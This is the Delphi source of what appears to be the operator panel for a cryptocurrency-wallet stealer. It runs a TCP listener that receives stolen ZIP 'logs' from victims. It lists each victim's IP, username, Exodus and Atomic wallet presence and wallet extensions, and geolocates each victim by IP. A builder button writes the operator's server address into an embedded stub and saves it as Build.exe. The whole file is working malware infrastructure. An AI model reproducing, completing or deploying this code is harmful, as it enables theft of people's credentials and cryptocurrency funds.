unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,
  Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.ImgList, System.Generics.Collections,
  IdHTTP, IdComponent, IdTCPConnection, IdTCPClient, IdBaseComponent, IdURI,
  IdSSLOpenSSL, IdSSL, System.JSON, System.IOUtils, System.UITypes, Math,
  IdCustomTCPServer, IdTCPServer, IdContext, IdGlobal, dxGDIPlusClasses,
  Vcl.Menus;


  type
  TResourceWriter = class
  public
    class procedure WriteServerInfoToResources(const ExePath, ServerIP: string; ServerPort: Integer);
  end;
type
  TFileInfo = record
    FileName: string;
    IP: string;
    Username: string;
    Exodus: string;
    Atomic: string;
    WalletExt: string;
    FileSize: Int64;
    CountryCode: string;
  end;

  TCountryInfo = record
    CountryCode: string;
    FlagIndex: Integer;
  end;

  TFileMonitorThread = class(TThread)
  private
    FLogFolder: string;
    FListView: TListView;
    FFileList: TList<TFileInfo>;
    FCountryCache: TDictionary<string, TCountryInfo>;
    FLastScanTime: TDateTime;

    procedure UpdateListView;
    function GetFlagIndex(const CountryCode: string): Integer;
    function GetCountryFromIP(const IP: string): TCountryInfo;
    function ParseFileName(const FileName: string): TFileInfo;
  protected
    procedure Execute; override;
  public
    constructor Create(AListView: TListView; const ALogFolder: string);
    destructor Destroy; override;
  end;

  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    StatusBar1: TStatusBar;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    Image1: TImage;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    ImageList1: TImageList;
    ListView1: TListView;
    MyFlags: TImageList;
    ListView2: TListView;
    GroupBox1: TGroupBox;
    Label6: TLabel;
    Edit1: TEdit;
    Button1: TButton;
    Button2: TButton;
    Buttonimages: TImageList;
    ErrorLogs: TRichEdit;
    Image4: TImage;
    Label7: TLabel;
    ListView3: TListView;
    IdTCPServer1: TIdTCPServer;
    AnodaImages: TImageList;
    Image2: TImage;
    Label4: TLabel;
    Label5: TLabel;
    MyTasks: TPopupMenu;
    E1: TMenuItem;
    W1: TMenuItem;
    M1: TMenuItem;
    T1: TMenuItem;
    w2: TMenuItem;
    K1: TMenuItem;
    D1: TMenuItem;
    Label8: TLabel;
    Label9: TLabel;
    Image3: TImage;
    edtServerIP: TEdit;
    Label10: TLabel;
    edtServerPort: TEdit;
    Label11: TLabel;
    Button3: TButton;
    procedure FormCreate(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);

    procedure IdTCPServer1Connect(AContext: TIdContext);
    procedure IdTCPServer1Execute(AContext: TIdContext);
    procedure E1Click(Sender: TObject);
    procedure W1Click(Sender: TObject);
    procedure M1Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure w2Click(Sender: TObject);
    procedure K1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
  private
     FMonitorThread: TFileMonitorThread;
    procedure SetupListView;
    procedure StartMonitoring;

  public

  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}


// Country code to flag index mapping
function GetDefaultCountryMapping: TDictionary<string, Integer>;
var
  CountryMap: TDictionary<string, Integer>;
begin
  CountryMap := TDictionary<string, Integer>.Create;

  // Map country codes to flag indices
  CountryMap.Add('AU', 0);  // Australia
  CountryMap.Add('AT', 1);  // Austria
  CountryMap.Add('CA', 2);  // Canada
  CountryMap.Add('CN', 3);  // China
  CountryMap.Add('CZ', 4);  // Czech Republic
  CountryMap.Add('FI', 5);  // Finland
  CountryMap.Add('FR', 6);  // France
  CountryMap.Add('DE', 7);  // Germany
  CountryMap.Add('GB', 8);  // United Kingdom
  CountryMap.Add('HK', 9);  // Hong Kong
  CountryMap.Add('HU', 10); // Hungary
  CountryMap.Add('IT', 11); // Italy
  CountryMap.Add('LU', 12); // Luxembourg
  CountryMap.Add('MX', 13); // Mexico
  CountryMap.Add('NG', 14); // Nigeria
  CountryMap.Add('PL', 15); // Poland
  CountryMap.Add('RO', 16); // Romania
  CountryMap.Add('RU', 17); // Russia
  CountryMap.Add('ES', 18); // Spain
  CountryMap.Add('CH', 20); // Switzerland
  CountryMap.Add('TR', 21); // Turkey
  CountryMap.Add('US', 22); // USA

  Result := CountryMap;
end;

{ TFileMonitorThread }

constructor TFileMonitorThread.Create(AListView: TListView; const ALogFolder: string);
begin
  inherited Create(True);
  FreeOnTerminate := True;

  FListView := AListView;
  FLogFolder := ALogFolder;
  FFileList := TList<TFileInfo>.Create;
  FCountryCache := TDictionary<string, TCountryInfo>.Create;
  FLastScanTime := 0;
end;

destructor TFileMonitorThread.Destroy;
begin
  FFileList.Free;
  FCountryCache.Free;
  inherited;
end;
procedure TFileMonitorThread.Execute;
var
  FileList: TStringList;
  I: Integer;
  FileName: string;
  FileInfo: TFileInfo;
  NeedUpdate: Boolean;
  SR: TSearchRec;
  FileSizes: TDictionary<string, Int64>;
  MaxFilesToProcess: Integer;
  BatchSize: Integer;
  StartIndex: Integer;
  ProcessedCount: Integer;
begin
  while not Terminated do
  begin
    try
      // Check if "Logs" folder exists
      if DirectoryExists(FLogFolder) then
      begin
        NeedUpdate := False;
        FileSizes := TDictionary<string, Int64>.Create;

        // Get all ZIP files using FindFirst/FindNext (XE7 compatible)
        FileList := TStringList.Create;
        try
          if FindFirst(FLogFolder + '\*.zip', faAnyFile, SR) = 0 then
          begin
            repeat
              FileList.Add(SR.Name);
              FileSizes.Add(SR.Name, SR.Size);  // Store filename and size
            until FindNext(SR) <> 0;
            FindClose(SR);
          end;

          // If number of files changed or it's been more than 30 seconds
          if (FFileList.Count <> FileList.Count) or
             (Now - FLastScanTime > (30 / 86400)) then // 30 seconds in days
          begin
            // Set up for batch processing
            BatchSize := 20; // Process 20 files at a time
            MaxFilesToProcess := FileList.Count;
            StartIndex := 0;
            ProcessedCount := 0;

            // Clear the list only once
            FFileList.Clear;

            // Resize list to avoid multiple reallocations
            FFileList.Capacity := MaxFilesToProcess;

            while (StartIndex < MaxFilesToProcess) and not Terminated do
            begin
              // Process a batch of files
              for I := StartIndex to Min(StartIndex + BatchSize - 1, MaxFilesToProcess - 1) do
              begin
                FileName := FileList[I];
                FileInfo := ParseFileName(FileName);

                // Get file size from our dictionary
                if FileSizes.ContainsKey(FileName) then
                  FileInfo.FileSize := FileSizes[FileName]
                else
                  FileInfo.FileSize := 0;  // Fallback if size not found

                // Only query country info for new IPs
                if not FCountryCache.ContainsKey(FileInfo.IP) then
                  FCountryCache.Add(FileInfo.IP, GetCountryFromIP(FileInfo.IP));

                FFileList.Add(FileInfo);
                Inc(ProcessedCount);
              end;

              // Update UI after each batch
              if ProcessedCount > 0 then
              begin
                NeedUpdate := True;
                Synchronize(UpdateListView);

                // Update status to show progress
                Synchronize(
                  procedure
                  begin
                    Form1.StatusBar1.Panels[0].Text := 'Loading: ' + IntToStr(ProcessedCount) +
                                                     ' of ' + IntToStr(MaxFilesToProcess);
                  end
                );
              end;

              // Move to next batch
              StartIndex := StartIndex + BatchSize;

              // Brief pause to let UI refresh and be responsive
              Sleep(10);
            end;

            FLastScanTime := Now;

            // Final update with complete count
            if NeedUpdate then
              Synchronize(
                procedure
                begin
                  Form1.StatusBar1.Panels[0].Text := 'Total Logs: ' + IntToStr(FFileList.Count);
                end
              );
          end;
        finally
          FileList.Free;
          FileSizes.Free;
        end;
      end;

      // Wait 2 seconds before checking again
      Sleep(2000);
    except
      on E: Exception do
      begin
        // Log the error
        Synchronize(
          procedure
          begin
            Form1.ErrorLogs.Lines.Add('Error in monitor thread: ' + E.Message);
          end
        );
        Sleep(5000); // Longer delay after error
      end;
    end;
  end;
end;

function TFileMonitorThread.GetCountryFromIP(const IP: string): TCountryInfo;
var
  HTTP: TIdHTTP;
  JSONValue: TJSONValue;
  CountryCode: string;
  ResponseStr: string;
  SSLHandler: TIdSSLIOHandlerSocketOpenSSL;
begin
  Result.CountryCode := 'XX'; // Default unknown
  Result.FlagIndex := 23;     // Custom flag for unknown countries

  // Skip IP lookup for local IPs
  if (IP = '127.0.0.1') or (IP = 'localhost') or
     (Pos('192.168.', IP) = 1) or (Pos('10.', IP) = 1) then
    Exit;

  HTTP := TIdHTTP.Create(nil);
  SSLHandler := TIdSSLIOHandlerSocketOpenSSL.Create(HTTP);
  try
    HTTP.IOHandler := SSLHandler;
    SSLHandler.SSLOptions.SSLVersions := [sslvTLSv1, sslvTLSv1_1, sslvTLSv1_2];

    HTTP.ConnectTimeout := 2000; // Reduced timeout
    HTTP.ReadTimeout := 2000;    // Reduced timeout

    try
      ResponseStr := HTTP.Get('http://ip-api.com/json/' + IP + '?fields=countryCode');

      JSONValue := TJSONObject.ParseJSONValue(ResponseStr);
      try
        if Assigned(JSONValue) and (JSONValue is TJSONObject) then
        begin
          CountryCode := TJSONObject(JSONValue).GetValue<string>('countryCode');
          Result.CountryCode := CountryCode;
          Result.FlagIndex := GetFlagIndex(CountryCode);
        end;
      finally
        JSONValue.Free;
      end;
    except
      // Just return default values on any error
    end;
  finally
    SSLHandler.Free;
    HTTP.Free;
  end;
end;

function TFileMonitorThread.GetFlagIndex(const CountryCode: string): Integer;
var
  CountryMap: TDictionary<string, Integer>;
  FlagIndex: Integer;
begin
  CountryMap := GetDefaultCountryMapping;
  try
    if CountryMap.TryGetValue(CountryCode, FlagIndex) then
      Result := FlagIndex
    else
      Result := 23; // Custom flag for countries not in the list
  finally
    CountryMap.Free;
  end;
end;

function TFileMonitorThread.ParseFileName(const FileName: string): TFileInfo;
var
  Parts: TArray<string>;
  CleanName: string;
  I, Count: Integer;
  CurrentPart: string;
  Separator: string;
begin
  // Remove .zip extension
  CleanName := StringReplace(FileName, '.zip', '', [rfIgnoreCase]);

  // XE7 compatible split
  Separator := '-';
  Count := 0;
  SetLength(Parts, 5); // Pre-allocate for 5 parts

  I := 1;
  while I <= Length(CleanName) do
  begin
    CurrentPart := '';
    while (I <= Length(CleanName)) and (CleanName[I] <> Separator) do
    begin
      CurrentPart := CurrentPart + CleanName[I];
      Inc(I);
    end;

    if Count < Length(Parts) then
      Parts[Count] := CurrentPart;

    Inc(Count);
    Inc(I); // Skip the separator
  end;

  Result.FileName := FileName;

  // Parse parts
  if Length(Parts) >= 1 then
    Result.IP := Parts[0];

  if Length(Parts) >= 2 then
    Result.Username := Parts[1];

  if Length(Parts) >= 3 then
    Result.Exodus := Parts[2];

  if Length(Parts) >= 4 then
    Result.Atomic := Parts[3];

  if Length(Parts) >= 5 then
    Result.WalletExt := Parts[4];
end;

procedure TFileMonitorThread.UpdateListView;
var
  I: Integer;
  Item: TListItem;
  FileInfo: TFileInfo;
  CountryInfo: TCountryInfo;
begin
  // Clear the list
  FListView.Items.BeginUpdate;
  try
    FListView.Items.Clear;

    for I := 0 to FFileList.Count - 1 do
    begin
      FileInfo := FFileList[I];
      Item := FListView.Items.Add;

      // Get country info from cache
      if FCountryCache.TryGetValue(FileInfo.IP, CountryInfo) then
        Item.ImageIndex := CountryInfo.FlagIndex
      else
        Item.ImageIndex := 23; // Default flag

      // Set other columns
      Item.SubItems.Add(FileInfo.IP);
      Item.SubItems.Add(FileInfo.Username);
      Item.SubItems.Add(FileInfo.Exodus);
      Item.SubItems.Add(FileInfo.Atomic);
      Item.SubItems.Add(FileInfo.WalletExt);
      Item.SubItems.Add(FormatFloat('#,##0', FileInfo.FileSize));
    end;
  finally
    FListView.Items.EndUpdate;
     // At the end of your UpdateListView method
       Form1.StatusBar1.Panels[0].Text := 'Total Logs: '  + IntToStr(FListView.Items.Count);;

  end;
end;

{ TForm1 }

procedure TForm1.Button1Click(Sender: TObject);
var
  Item: TListItem;
begin
   if ListView2.Selected <> nil then
  begin
    Item := ListView2.Selected;

    // Stop listening
    if IdTCPServer1.Active and (IdTCPServer1.DefaultPort = StrToIntDef(Item.Caption, 0)) then
    begin
      IdTCPServer1.Active := False;
      StatusBar1.Panels[1].Text := 'Stopped listening on port: ' + Item.Caption;
    end;

    // Remove from list
    ListView2.Items.Delete(Item.Index);
  end else
    MessageDlg('Please select a port to remove', mtInformation, [mbOK], 0);
end;

procedure TForm1.Button2Click(Sender: TObject);
var
  Port: Integer;
  Item: TListItem;
begin
   if TryStrToInt(Edit1.Text, Port) and (Port > 0) and (Port < 65536) then
  begin
    // Check if port is already in the list
    for Item in ListView2.Items do
      if Item.Caption = Edit1.Text then
      begin
        MessageDlg('Port ' + Edit1.Text + ' is already in the list', mtInformation, [mbOK], 0);
        Exit;
      end;

    // Configure the server
    IdTCPServer1.Active := False; // Close any existing connection
    IdTCPServer1.DefaultPort := Port;

    // Try to open the port
    try
      IdTCPServer1.Active := True;

      // If successful, add to list
      Item := ListView2.Items.Add;
      Item.Caption := Edit1.Text;

      StatusBar1.Panels[1].Text := 'Started listening on port: ' + Edit1.Text;
    except
      on E: Exception do
      begin
        MessageDlg('Failed to listen on port: ' + Edit1.Text + #13#10 +
                   'Error: ' + E.Message, mtError, [mbOK], 0);
      end;
    end;
  end else
    MessageDlg('Please enter a valid port number (1-65535)', mtError, [mbOK], 0);
end;


  procedure ExtractEmbeddedExeToFile(const ResourceName, OutputPath: string);
var
  ResStream: TResourceStream;
begin
  // 'RCDATA' is the type you selected when embedding
  ResStream := TResourceStream.Create(HInstance, ResourceName, RT_RCDATA);
  try
    ResStream.SaveToFile(OutputPath);
  finally
    ResStream.Free;
  end;
end;

        class procedure TResourceWriter.WriteServerInfoToResources(const ExePath, ServerIP: string; ServerPort: Integer);
var
  UpdateHandle: THandle;
  IPStream, PortStream: TMemoryStream;
  PortStr: string;
begin
  // Create memory streams for the resources
  IPStream := TMemoryStream.Create;
  PortStream := TMemoryStream.Create;

  try
    // Prepare the data
    IPStream.Write(ServerIP[1], Length(ServerIP) * SizeOf(Char));

    PortStr := IntToStr(ServerPort);
    PortStream.Write(PortStr[1], Length(PortStr) * SizeOf(Char));

    // Begin resource update on the executable
    UpdateHandle := BeginUpdateResource(PChar(ExePath), False);
    if UpdateHandle = 0 then
      raise Exception.Create('Failed to open executable for resource writing');

    try
      // Add server IP resource (ID: 101)
      if not UpdateResource(UpdateHandle, RT_RCDATA, MAKEINTRESOURCE(101),
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           IPStream.Memory, IPStream.Size) then
        raise Exception.Create('Failed to update IP resource');

      // Add server port resource (ID: 102)
      if not UpdateResource(UpdateHandle, RT_RCDATA, MAKEINTRESOURCE(102),
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           PortStream.Memory, PortStream.Size) then
        raise Exception.Create('Failed to update Port resource');

      // Commit the changes
      if not EndUpdateResource(UpdateHandle, False) then
        raise Exception.Create('Failed to commit resource changes');

    except
      // If something goes wrong, abort the update
      EndUpdateResource(UpdateHandle, True);
      raise;
    end;
  finally
    IPStream.Free;
    PortStream.Free;
  end;
end;

procedure TForm1.Button3Click(Sender: TObject);
var
  ServerPort: Integer;
  TempStubPath, DesktopPath, DestPath: string;
begin
  // Get paths
  TempStubPath := GetEnvironmentVariable('TEMP') + '\OctalynStub_temp.exe';
  DesktopPath := GetEnvironmentVariable('USERPROFILE') + '\Desktop\';
  DestPath := DesktopPath + 'Build.exe';

  // Validate input parameters
  if Trim(edtServerIP.Text) = '' then
  begin
    ShowMessage('Please enter a server IP address.');
    Exit;
  end;

  if not TryStrToInt(edtServerPort.Text, ServerPort) then
  begin
    ShowMessage('Please enter a valid port number.');
    Exit;
  end;

  try
    // Extract embedded stub to a temp location
    ExtractEmbeddedExeToFile('Resource_1', TempStubPath);

    // Copy the extracted stub to the desktop as Build.exe
    if not CopyFile(PChar(TempStubPath), PChar(DestPath), False) then
      RaiseLastOSError;

    // Modify Build.exe's resources
    TResourceWriter.WriteServerInfoToResources(
      DestPath,
      edtServerIP.Text,
      ServerPort
    );

    ShowMessage('Build.exe has been created on your desktop with your server settings.');
  except
    on E: Exception do
      ShowMessage('Error: ' + E.Message);
  end;

  // Optional: Clean up temp file
  DeleteFile(TempStubPath);
end;

procedure TForm1.D1Click(Sender: TObject);
begin
    MessageBoxA(0, 'Will Be Released Soon, This Feature Not Added Yet.', 'Auto-Tasks', 0);
end;

procedure TForm1.E1Click(Sender: TObject);
begin
      MessageBoxA(0, 'Will Be Released Soon, This Feature Not Added Yet.', 'Auto-Tasks', 0);
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  SetupListView;
  StartMonitoring;

  // Set the active tab to the one with the ListView
  PageControl1.ActivePage := TabSheet1;

  // Update status bar
  StatusBar1.SimpleText := 'Monitoring ZIP files in the Logs folder...';

end;
procedure TForm1.IdTCPServer1Connect(AContext: TIdContext);
begin
  TThread.Queue(nil,
    procedure
    begin
      StatusBar1.Panels[3].Text := 'Client connected: ' + AContext.Connection.Socket.Binding.PeerIP;
    end
  );
end;

procedure TForm1.IdTCPServer1Execute(AContext: TIdContext);
var
  ReceivedData: string;
  Command: Char;
  FileName: string;
  FileSize: Int64;
  LogsFolder: string;
  FileStream: TFileStream;
  Buffer: TIdBytes; // Changed from TBytes to TIdBytes
  BytesRead: Integer;
  TotalBytesRead: Int64;
  StatusMsg: string; // For storing formatted messages
begin
  try
    // Read data from the client
    ReceivedData := AContext.Connection.IOHandler.ReadLn();

    // Check if data is long enough to extract command
    if Length(ReceivedData) > 0 then
    begin
      // First character is the command
      Command := ReceivedData[1];
      // Remove the command from the data
      Delete(ReceivedData, 1, 1);
      // Trim any whitespace or newline characters
      ReceivedData := Trim(ReceivedData);

      // Regular message command
      if Command = 'H' then
      begin
        TThread.Queue(nil,
          procedure
          begin
            StatusBar1.Panels[2].Text := 'Message: ' + ReceivedData;
          end
        );
      end
      // ZIP file transfer command
      else if Command = 'Z' then
      begin
        // The data contains the filename of the ZIP
        FileName := ReceivedData;

        // Read the file size
        FileSize := StrToInt64(AContext.Connection.IOHandler.ReadLn());

        // Create Logs folder if it doesn't exist
        LogsFolder := ExtractFilePath(Application.ExeName) + 'Logs';
        if not DirectoryExists(LogsFolder) then
          CreateDir(LogsFolder);

        // Create a file stream to save the ZIP
        FileStream := TFileStream.Create(LogsFolder + '\' + FileName, fmCreate);
        try
          // Initialize buffer and counters
          SetLength(Buffer, 8192); // 8KB buffer
          TotalBytesRead := 0;

          while TotalBytesRead < FileSize do
          begin
            // Determine how many bytes to read next
           BytesRead := Integer(Min(Length(Buffer), FileSize - TotalBytesRead));

  // Read EXACTLY BytesRead bytes, block until received
  AContext.Connection.IOHandler.ReadBytes(Buffer, BytesRead, False); // False = raise exception if not enough

  FileStream.WriteBuffer(Buffer[0], BytesRead);
  Inc(TotalBytesRead, BytesRead);

            // Create status message outside of anonymous method
            StatusMsg := 'Receiving file: ' + FileName + ' (' +
                        IntToStr(TotalBytesRead) + '/' + IntToStr(FileSize) + ' bytes)';

            // Update UI with progress
            TThread.Queue(nil,
              procedure
              begin
                StatusBar1.Panels[2].Text := StatusMsg;
              end
            );
          end;

          // File transfer complete - create message outside anonymous method
          StatusMsg := 'File received: ' + FileName;

          TThread.Queue(nil,
            procedure
            begin
              StatusBar1.Panels[2].Text := StatusMsg;
            end
          );
        finally
          FileStream.Free;
        end;
      end;
    end;
  except
    on E: Exception do
    begin
      // Store the error message before passing to anonymous method
      StatusMsg := 'Error: ' + E.Message;

      TThread.Queue(nil,
        procedure
        begin
          StatusBar1.Panels[2].Text := StatusMsg;
        end
      );
    end;
  end;
end;

procedure TForm1.K1Click(Sender: TObject);
begin
    MessageBoxA(0, 'Will Be Released Soon, This Feature Not Added Yet.', 'Auto-Tasks', 0);
end;

procedure TForm1.M1Click(Sender: TObject);
begin
    MessageBoxA(0, 'Will Be Released Soon, This Feature Not Added Yet.', 'Auto-Tasks', 0);
end;

procedure TForm1.SetupListView;
begin
  // Setup ListView columns
  ListView1.ViewStyle := vsReport;
  ListView1.SmallImages := MyFlags;

  // Clear any existing columns
  ListView1.Columns.Clear;

  // Add columns
  with ListView1.Columns.Add do
  begin
    Caption := 'Flag';
    Width := 50;
  end;

  with ListView1.Columns.Add do
  begin
    Caption := 'IP';
    Width := 120;
  end;

  with ListView1.Columns.Add do
  begin
    Caption := 'Username';
    Width := 120;
  end;

  with ListView1.Columns.Add do
  begin
    Caption := 'Exodus';
    Width := 80;
  end;

  with ListView1.Columns.Add do
  begin
    Caption := 'Atomic';
    Width := 80;
  end;

  with ListView1.Columns.Add do
  begin
    Caption := 'Wallet Extensions';
    Width := 120;
  end;

  with ListView1.Columns.Add do
  begin
    Caption := 'File Size';
    Width := 80;
    Alignment := taRightJustify;
  end;

  // Additional ListView configurations
  ListView1.HideSelection := False;
  ListView1.RowSelect := True;
  ListView1.GridLines := True;
end;

procedure TForm1.StartMonitoring;
var
  LogsFolder: string;
begin
  // Get the logs folder path (current directory + 'Logs')
  LogsFolder := IncludeTrailingPathDelimiter(ExtractFilePath(Application.ExeName)) + 'Logs';

  // Create the directory if it doesn't exist
  if not DirectoryExists(LogsFolder) then
    CreateDir(LogsFolder);

  // Create and start the monitor thread
  FMonitorThread := TFileMonitorThread.Create(ListView1, LogsFolder);
  FMonitorThread.Start;
end;

procedure TForm1.T1Click(Sender: TObject);
begin
    MessageBoxA(0, 'Will Be Released Soon, This Feature Not Added Yet.', 'Auto-Tasks', 0);
end;

procedure TForm1.W1Click(Sender: TObject);
begin
    MessageBoxA(0, 'Will Be Released Soon, This Feature Not Added Yet.', 'Auto-Tasks', 0);
end;

procedure TForm1.w2Click(Sender: TObject);
begin
    MessageBoxA(0, 'Will Be Released Soon, This Feature Not Added Yet.', 'Auto-Tasks', 0);
end;

end.
